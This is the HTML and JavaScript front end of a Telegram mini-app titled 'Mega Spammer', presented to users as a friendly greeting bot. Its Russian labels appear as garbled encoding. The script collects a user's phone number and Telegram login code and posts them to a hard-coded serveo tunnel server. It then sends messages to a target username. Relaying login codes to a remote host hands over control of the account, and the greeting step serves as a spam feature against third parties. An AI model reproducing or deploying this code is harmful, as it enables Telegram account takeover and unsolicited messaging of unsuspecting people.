<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mega Spammer</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            font-family: sans-serif; 
            padding: 20px; 
            background-color: var(--tg-theme-bg-color, #fff); 
            color: var(--tg-theme-text-color, #000); 
            display: flex; flex-direction: column; align-items: center;
        }
        input { 
            width: 100%; padding: 12px; margin-bottom: 10px; 
            border-radius: 8px; border: 1px solid #ccc; 
            box-sizing: border-box; 
        }
        button { 
            width: 100%; padding: 14px; 
            background-color: var(--tg-theme-button-color, #3390ec); 
            color: #fff; border: none; border-radius: 8px; 
            font-weight: bold; cursor: pointer; 
        }
        .hidden { display: none; }
        #status { margin-top: 15px; color: green; font-size: 14px; text-align: center; }
        .error { color: red !important; }
    </style>
</head>
<body>
    <h2 style="margin-bottom: 20px;">ü§ñ –ü—Ä–∏–≤–µ—Ç-–±–æ—Ç</h2>
    
    <div id="step1" style="width: 100%;">
        <input type="tel" id="phone" placeholder="+7999...">
        <button onclick="login()">–ü–æ–ª—É—á–∏—Ç—å –∫–æ–¥</button>
    </div>

    <div id="step2" class="hidden" style="width: 100%;">
        <input type="number" id="code" placeholder="–ö–æ–¥ –∏–∑ Telegram">
        <button onclick="sendCode()">–í–æ–π—Ç–∏</button>
    </div>

    <div id="step3" class="hidden" style="width: 100%;">
        <input type="text" id="target" placeholder="–Æ–∑–µ—Ä–Ω–µ–π–º –¥—Ä—É–≥–∞ (–±–µ–∑ @)">
        <input type="text" id="btnName" placeholder="–ò–º—è –∫–Ω–æ–ø–∫–∏" oninput="updBtn()">
        <button id="mainBtn" onclick="fire()">–ü–æ–ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–æ–≤–∞—Ç—å</button>
    </div>
    
    <div id="status"></div>

    <script>
        // ============================================
        // –¢–í–û–Ø –°–°–´–õ–ö–ê SERVEO (–ò–ó –ü–û–°–õ–ï–î–ù–ï–ì–û –°–û–û–ë–©–ï–ù–ò–Ø)
        const SERVER_URL = "https://8b5f48c39c2b280f-91-239-23-66.serveousercontent.com"; 
        // ============================================

        const tg = window.Telegram.WebApp;
        tg.expand();
        let myPhone = localStorage.getItem("ph") || "";
        if(myPhone) document.getElementById('phone').value = myPhone;

        function showStatus(text, isErr = false) {
            const el = document.getElementById('status');
            el.innerText = text;
            el.className = isErr ? 'error' : '';
        }

        async function req(path, body) {
            try {
                const r = await fetch(SERVER_URL + path, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(body)
                });
                return await r.json();
            } catch (e) {
                return {status: 'error', message: '–û—à–∏–±–∫–∞ —Å–µ—Ç–∏. –ü—Ä–æ–≤–µ—Ä—å —Ç—É–Ω–Ω–µ–ª—å –Ω–∞ –ü–ö!'};
            }
        }

        async function login() {
            myPhone = document.getElementById('phone').value.replace(/\s/g, '');
            localStorage.setItem("ph", myPhone);
            showStatus("–û—Ç–ø—Ä–∞–≤–∫–∞ –∑–∞–ø—Ä–æ—Å–∞...");
            
            let res = await req('/login/start', {phone: myPhone});
            if(res.status == 'ok') {
                document.getElementById('step1').classList.add('hidden');
                if(res.step == 'authorized') {
                    document.getElementById('step3').classList.remove('hidden');
                    showStatus("–í—ã —É–∂–µ –≤–æ—à–ª–∏!");
                } else {
                    document.getElementById('step2').classList.remove('hidden');
                    showStatus("–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram");
                }
            } else showStatus(res.message, true);
        }

        async function sendCode() {
            let code = document.getElementById('code').value.trim();
            showStatus("–ü—Ä–æ–≤–µ—Ä—è–µ–º...");
            let res = await req('/login/complete', {phone: myPhone, code: code});
            if(res.status == 'ok') {
                document.getElementById('step2').classList.add('hidden');
                document.getElementById('step3').classList.remove('hidden');
                showStatus("–£—Å–ø–µ—à–Ω–æ!");
            } else showStatus(res.message, true);
        }

        function updBtn() {
            let t = document.getElementById('btnName').value;
            document.getElementById('mainBtn').innerText = t ? "–ü–æ–ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–æ–≤–∞—Ç—å " + t : "–ü–æ–ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–æ–≤–∞—Ç—å";
        }

        async function fire() {
            let target = document.getElementById('target').value.trim();
            showStatus("–û—Ç–ø—Ä–∞–≤–∫–∞...");
            let res = await req('/greet', {phone: myPhone, target: target});
            if(res.status == 'ok') showStatus("–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: " + res.sent);
            else showStatus(res.message, true);
        }
    </script>
</body>
</html>